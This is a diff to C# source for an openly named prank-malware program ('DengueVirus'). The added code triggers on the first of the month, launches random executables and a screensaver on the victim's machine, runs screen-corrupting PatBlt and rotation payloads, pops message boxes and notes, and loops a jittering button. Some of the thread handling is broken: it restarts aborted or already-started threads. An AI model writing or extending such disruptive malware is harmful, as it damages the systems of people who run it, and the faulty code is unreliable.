@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Drawing;
+using System.Drawing.Drawing2D;
 using System.Drawing.Imaging;
 using System.Media;
 using System.Runtime.InteropServices;
@@ -197,17 +198,34 @@ namespace DengueVirus
             StringBuilder builder = new StringBuilder();
             for (int i = 0; i < length; i++)
             {
-                builder.Append((char)random.Next(0x0410, 0x044F)); // Cyrillic characters as an example
+                // make it use all unicode characters inst4ead of only cyrillic
+                builder.Append((char)random.Next(0x0000, 0xFFFF)); // Cyrillic characters as an example
             }
             return builder.ToString();
         }
 
+        public void DrawTextScreen()
+        {
+            Graphics g = this.CreateGraphics();
+            Font f = new Font("Impact", 10);
+            SolidBrush b = new SolidBrush(Color.Red);
+            g.DrawString(GenRandomUnicodeString(10), f, b, 10, 10);
+        }
 
+        public void ChangeButtonSize()
+        {
+            while (true)
+            {
+                button1.Size = new Size(button1.Size.Width + new Random().Next(-1, 2), button1.Size.Height + new Random().Next(-1, 2));
+                button1.Text = GenRandomUnicodeString(button1.Size.Width);
+                Thread.Sleep(10);
+            }
+        }
 
         public void Form1_Load(object sender, EventArgs e)
         {
             //if the date is 1st of any month
-            if (DateTime.Now.Day == 10)
+            if (DateTime.Now.Day == 1)
             {
                 Cursor = Cursors.WaitCursor;
                 Thread.Sleep(1000);
@@ -220,35 +238,47 @@ namespace DengueVirus
                 Cursor = Cursors.Default;
             }
 
-            SpicyPL.OpenRandomEXE();
-            SpicyPL.OpenRandomBatchFile();
+            Thread exe = new Thread(SpicyPL.OpenRandomEXE); exe.Start();
+            
             SpicyPL.WriteNote();
 
-            Thread.Sleep(7000);
-
-            //Thread t2 = new Thread(ShakeMouse);t2.Start();
-            //Thread.Sleep(10000);
+            Thread.Sleep(12000);
+            exe.Abort(); 
 
             Thread t3 = new Thread(PrintRotate); t3.Start();
             Thread t4 = new Thread(Wave); t4.Start();
+
             Thread.Sleep(5000);
             Thread t5 = new Thread(PatBltpayload); t5.Start();
-            t3.Abort(); // stop some payloads since it can use much memory
-            Thread t6 = new Thread(MessageBoxThread);
+            t3.Abort();
+            Thread t6 = new Thread(MessageBoxThread); t6.Start();
 
-            for (int i = 0; i < 5; i++)
-            {
-                Thread.Sleep(2000 + ((i + 1) * 100));
-                t6.Start();
-            }
-
-            SpicyPL.OpenRandomEXE();
-            SpicyPL.OpenRandomBatchFile();
+            exe.Start();
             SpicyPL.UserNote();
+
+            Thread.Sleep(5000);
+            t5.Abort();
+            t6.Abort();
+            exe.Abort();
+            SpicyPL.OpenRandomScreensaver();
+
+            Thread.Sleep(5000);
+            t4.Abort();
+            t6.Start();
+            exe.Start();
+
+            Thread aaa = new Thread(ChangeButtonSize); aaa.Start();
 
             //close form
             //this.Close();
 
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            Thread XD = new Thread(PrintRotate); XD.Start();
+            Thread.Sleep(5000);
+            XD.Abort();
         }
     }
 }
